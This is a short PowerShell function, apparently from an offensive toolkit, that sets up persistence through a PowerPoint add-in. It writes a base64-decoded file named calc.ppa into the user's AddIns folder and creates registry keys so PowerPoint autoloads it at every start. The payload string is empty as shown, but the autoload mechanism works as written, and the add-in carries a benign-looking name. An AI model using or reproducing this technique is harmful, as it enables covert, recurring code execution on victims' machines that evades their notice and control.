# PowerPointVBAadd-ins
#----------------------------------------------------------------------------------------------------------------------------------#
function PowerPointVBAadd-ins_Persist {
Write-host -ForegroundColor Yellow "Set PowerPointVBAadd-ins ..."
Start-Sleep 2
    $OfficePath="C:\Program Files (x86)\Microsoft Office\"+"Office*" 
    Try  
    {  
        $OfficeVersion=dir -name $OfficePath -ErrorAction Stop  
        $Ver=$OfficeVersion.Substring( $OfficeVersion.LastIndexOf("e")+1 )
    }  
    Catch  
    {  
        return 
    }  

    $F = ''
    $filename = $env:APPDATA+"\Microsoft\AddIns\calc.ppa"
    $bytes = [Convert]::FromBase64String($F)
    [IO.File]::WriteAllBytes($filename, $bytes)
    $ExcelRegPath="HKCU:\Software\Microsoft\Office\"+$Ver+".0\PowerPoint\"
    New-Item -type Directory $ExcelRegPath"AddIns" -ErrorAction SilentlyContinue | Out-Null
    New-Item -type Directory $ExcelRegPath"AddIns\calc" -ErrorAction SilentlyContinue | Out-Null
    New-ItemProperty $ExcelRegPath"AddIns\calc" Autoload -value "1" -propertyType DWORD -ErrorAction SilentlyContinue | Out-Null
    New-ItemProperty $ExcelRegPath"AddIns\calc" Path -value "calc.ppa" -propertyType string -ErrorAction SilentlyContinue | Out-Null
Write-host -ForegroundColor Green "Done!"
}
